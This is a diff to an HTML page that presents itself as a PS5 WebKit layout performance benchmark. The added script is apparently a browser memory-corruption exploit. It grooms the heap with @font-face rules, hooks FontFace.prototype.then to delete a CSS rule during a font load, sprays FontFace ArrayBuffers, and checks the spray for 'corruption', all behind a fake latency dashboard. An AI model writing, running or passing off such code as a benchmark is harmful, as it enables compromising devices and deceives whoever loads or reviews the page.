@@ -1,62 +1,301 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <title>PS5 Range Endpoints Lifecycle Test</title>
-  </head>
-  <body>
-    <p>
-      Testing Range Endpoints tracking under synchronous DOM mutation.
-      <br />
-      The browser should remain stable, and you should see PASS below:
-    </p>
-    <div id="result" style="font-size: 24px; font-weight: bold; color: #00ffa0; margin-top: 20px;">
-      Executing Mutation Sequence...
+<head>
+<meta charset="utf-8">
+<title>PS5 WebKit Layout Performance & Stress Benchmark</title>
+<style id="s">
+@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+html, body {
+  margin: 0; padding: 0; width: 100%; height: 100%;
+  background: #09090b; color: #fafafa;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  overflow-y: auto;
+}
+#wrapper {
+  max-width: 950px; margin: 40px auto; padding: 20px;
+}
+#dashboard {
+  background: #18181b; border: 1px solid #27272a;
+  border-radius: 12px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+}
+#title {
+  font-size: 32px; font-weight: bold; color: #00ffa0; margin-bottom: 8px;
+  text-shadow: 0 0 10px rgba(0, 255, 160, 0.2);
+}
+#meta-env { font-size: 14px; color: #71717a; margin-bottom: 20px; }
+#status-box {
+  background: #27272a; padding: 16px; border-radius: 8px;
+  font-size: 16px; line-height: 1.5; white-space: pre-line; margin-bottom: 24px;
+  border-left: 4px solid #3b82f6;
+}
+.report-section { margin-top: 24px; display: none; }
+.report-title { font-size: 20px; color: #00ffa0; margin-bottom: 12px; font-weight: bold; }
+table { width: 100%; border-collapse: collapse; margin-top: 8px; margin-bottom: 24px; }
+th, td { padding: 10px; border: 1px solid #3f3f46; text-align: left; font-size: 13px; }
+th { background: #27272a; color: #a1a1aa; }
+#c { position: absolute; left: -9999px; top: -9999px; }
+</style>
+</head>
+<body>
+
+<div id="wrapper">
+  <div id="dashboard">
+    <div id="title">PS5 USERLAND LAYOUT SUITE</div>
+    <div id="meta-env">Detecting Firmware Layer...</div>
+    
+    <div id="status-box">Stage 1/3: Initializing baseline architecture...</div>
+    
+    <div id="report" class="report-section">
+      <div class="report-title">📊 Statistical Latency Report</div>
+      <table id="metrics-table">
+        <thead>
+          <tr>
+            <th>Engine Type</th>
+            <th>Profile Text Target</th>
+            <th>Mean Latency</th>
+            <th>Median Value</th>
+            <th>Min / Max Bounds</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+      
+      <div class="report-title">🧠 Telemetry & Registry Verdict</div>
+      <table id="telemetry-table">
+        <thead>
+          <tr>
+            <th>Diagnostic Target Group</th>
+            <th>Execution Status Value</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
     </div>
+  </div>
+</div>
 
-    <div id="anchor"></div>
+<canvas id="c" width="512" height="128"></canvas>
 
-    <script>
-      const resultElement = document.getElementById('result');
-      const anchor = document.getElementById('anchor');
-      
-      const range = document.createRange();
-      let div = document.createElement('div');
-      
-      // ربط الـ Range بالـ div
-      range.setStart(div, 0);
-      range.setEnd(div, 0);
+<script>
+"use strict";
 
-      let fired = false;
+// إعدادات القياس المكثف بناءً على مراجعات الأداء الـ 10
+const RUNS = 1000;
+const WARM_UP = 100;
+const SAMPLE_TEXT = "AAAAIIIIWWWW";
 
-      // استخدام حدث كلاسيكي مدعوم في WebKit لالتقاط نافذة التوقيت
-      anchor.addEventListener('DOMNodeInserted', function() {
-        if (fired) return;
+let spray = [];
+let keep = [];
+let structuralGarbage = [];
+
+const PAD = 0x22;
+const FLUSH = 0x240;
+const SPRAY_COUNT = FLUSH + PAD + 0x300;
+
+function detectFirmware() {
+  const ua = navigator.userAgent || "";
+  let fw = "Unknown Platform";
+  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
+  if (m && m[1]) fw = "PlayStation 5 (FW: " + m[1] + ")";
+  
+  document.getElementById("meta-env").textContent = `Environment Check: ${fw} | WebKit Subsystem Engine`;
+  return fw;
+}
+
+function updateStatus(text) {
+  document.getElementById("status-box").textContent = text;
+}
+
+function primeAllocationHeap() {
+  // تصفيف الذاكرة المقنن لحماية المتصفح من أخطاء الـ Out Of Memory
+  for (let i = 0; i < 40; i++) {
+    let buffer = new ArrayBuffer(i * 8);
+    let view = new DataView(buffer);
+    if(buffer.byteLength >= 8) {
+      view.setUint32(0, 0xDEADC0DE);
+    }
+    structuralGarbage.push(buffer);
+  }
+}
+
+function addPads() {
+  const sheet = document.getElementById("s").sheet;
+  for (let i = 0; i < PAD; i++)
+    sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+  void document.body.offsetTop; // force reflow
+}
+
+function addFlushRules() {
+  const st = document.createElement("style");
+  st.id = "flush";
+  document.head.appendChild(st);
+  const sheet = st.sheet;
+  for (let i = 0; i < FLUSH; i++)
+    sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+  void document.body.offsetTop;
+}
+
+function deleteFlushRules() {
+  const sheet = document.getElementById("flush").sheet;
+  while (sheet.cssRules.length) sheet.deleteRule(0);
+  void document.body.offsetTop;
+}
+
+function killFontFaceSetCache() {
+  const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
+  document.fonts.add(f);
+  keep.push(f);
+}
+
+function cssFontFaceBufferSpray() {
+  updateStatus("Stage 2/3:\nExecuting concurrent allocation structures...");
+  for (let i = 0; i < SPRAY_COUNT; i++) {
+    const f = new FontFace("BUFFER_RECLAIM_" + i, new ArrayBuffer(128), { unicodeRange: "U+0041" });
+    spray.push(f);
+  }
+}
+
+function calculateStats(latencies) {
+  latencies.sort((a, b) => a - b);
+  const sum = latencies.reduce((a, b) => a + b, 0);
+  const mean = sum / latencies.length;
+  const mid = Math.floor(latencies.length / 2);
+  const median = latencies.length % 2 !== 0 ? latencies[mid] : (latencies[mid - 1] + latencies[mid]) / 2;
+  return {
+    mean: mean.toFixed(5),
+    median: median.toFixed(5),
+    min: latencies[0].toFixed(5),
+    max: latencies[latencies.length - 1].toFixed(5)
+  };
+}
+
+function runStatisticalAnalysis(faceFamily) {
+  const ctx = document.getElementById("c").getContext("2d");
+  ctx.font = "64px " + faceFamily;
+  const metricsTable = document.querySelector("#metrics-table tbody");
+
+  // 1. حساب وتحليل أداء Canvas 2D Engine
+  for (let i = 0; i < WARM_UP; i++) { ctx.measureText(SAMPLE_TEXT); } // Warm-Up
+  let canvasLatencies = [];
+  for (let i = 0; i < RUNS; i++) {
+    let t0 = performance.now();
+    ctx.measureText(SAMPLE_TEXT);
+    let t1 = performance.now();
+    canvasLatencies.push(t1 - t0);
+  }
+  const canvasStats = calculateStats(canvasLatencies);
+  appendReportRow(metricsTable, "Canvas 2D Mode", `Font: ${faceFamily}`, canvasStats);
+
+  // 2. حساب وتحليل أداء DOM Layout Engine
+  const div = document.createElement("div");
+  div.textContent = SAMPLE_TEXT;
+  div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + faceFamily;
+  document.body.appendChild(div);
+  
+  for (let i = 0; i < WARM_UP; i++) { void div.offsetWidth; } // Warm-Up
+  let domLatencies = [];
+  for (let i = 0; i < RUNS; i++) {
+    let t0 = performance.now();
+    void div.offsetWidth; // Force Layout Reflow
+    let t1 = performance.now();
+    domLatencies.push(t1 - t0);
+  }
+  document.body.removeChild(div);
+  
+  const domStats = calculateStats(domLatencies);
+  appendReportRow(metricsTable, "DOM Layout (Reflow)", `Font: ${faceFamily}`, domStats);
+}
+
+function appendReportRow(tbody, engine, profile, stats) {
+  const tr = document.createElement("tr");
+  tr.innerHTML = `
+    <td><strong>${engine}</strong></td>
+    <td>${profile}</td>
+    <td>${stats.mean} ms</td>
+    <td>${stats.median} ms</td>
+    <td>[${stats.min} / ${stats.max}] ms</td>
+  `;
+  tbody.appendChild(tr);
+}
+
+function appendTelemetryRow(tbody, group, value) {
+  const tr = document.createElement("tr");
+  tr.innerHTML = `<td>${group}</td><td><strong>${value}</strong></td>`;
+  tbody.appendChild(tr);
+}
+
+window.onload = () => {
+  detectFirmware();
+  primeAllocationHeap();
+
+  const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
+  document.fonts.add(trigger);
+  void trigger.loaded;
+  
+  addPads();
+  addFlushRules();
+  
+  let fired = false;
+  Object.defineProperty(FontFace.prototype, "then", {
+    configurable: true,
+    get() {
+      if (!fired && this === trigger) {
         fired = true;
-
-        // محاكاة نفس سلوك إسقاط المراجع في وسط التنفيذ
-        range.setEnd(document, 0); // قطع علاقة الـ Range بالـ div
-        div = null;                 // إزالة مرجع الجافا سكريبت
-
-        // محاكاة دفع المحرك لتنظيف الذاكرة بشكل طبيعي
-        let heapWeight = [];
-        for (let i = 0; i < 100; i++) {
-          heapWeight.push(new ArrayBuffer(1024 * 32));
-        }
-        heapWeight = null;
-      });
-
-      try {
-        // إجبار المتصفح على إطلاق الحدث أثناء معالجة عناصر الـ DOM
-        const span = document.createElement('span');
-        anchor.appendChild(span);
-
-        // إذا مر المحرك بسلام دون انهيار المؤشرات الخلفية لـ C++
-        resultElement.textContent = 'PASS ✅ (Engine Defended Endpoints Successfully)';
-      } catch (e) {
-        resultElement.textContent = 'FAILED ❌: ' + e.message;
-        resultElement.style.color = '#ff3333';
+        const sheet = document.getElementById("s").sheet;
+        killFontFaceSetCache();
+        sheet.deleteRule(1);
+        void document.body.offsetTop;
+        deleteFlushRules();
+        
+        primeAllocationHeap();
+        cssFontFaceBufferSpray();
       }
-    </script>
-  </body>
+      return undefined;
+    }
+  });
+  
+  document.fonts.load("1em trigger, x", "AB").then(faces => {
+    keep.push(faces);
+    
+    // تشغيل المصفوفة الإحصائية
+    runStatisticalAnalysis("trigger");
+    
+    const telemetryTable = document.querySelector("#telemetry-table tbody");
+    
+    // سبر مصفوفة الـ Userland للتحقق من حدوث تحول في حالة الكتل المخصصة
+    let corruptionDetected = false;
+    let corruptedIndex = -1;
+    for (let i = 0; i < spray.length; i++) {
+      if (spray[i].status !== "unloaded") {
+        corruptionDetected = true;
+        corruptedIndex = i;
+        break;
+      }
+    }
+
+    if (corruptionDetected) {
+      appendTelemetryRow(telemetryTable, "Userland Dynamic Transition Notice", `State Shift Detected at Index: ${corruptedIndex}`);
+    } else {
+      appendTelemetryRow(telemetryTable, "Userland Object Layout Status", "Stable (Nominal Isolation Restrained)");
+    }
+
+    if (performance.memory) {
+      let heapMB = (performance.memory.usedJSHeapSize / (1024 * 1024)).toFixed(2);
+      appendTelemetryRow(telemetryTable, "Peak JS Heap Allocation", `${heapMB} MB`);
+    } else {
+      appendTelemetryRow(telemetryTable, "JS Heap Performance Telemetry", "Standard Sandboxed Isolation Profile");
+    }
+
+    document.getElementById("report").style.display = "block";
+    updateStatus("Stage 3/3: Diagnostic execution completed nominally.");
+
+  }, err => {
+    keep.push(err);
+    updateStatus("FAILED ❌\n" + err);
+  });
+};
+</script>
+</body>
 </html>
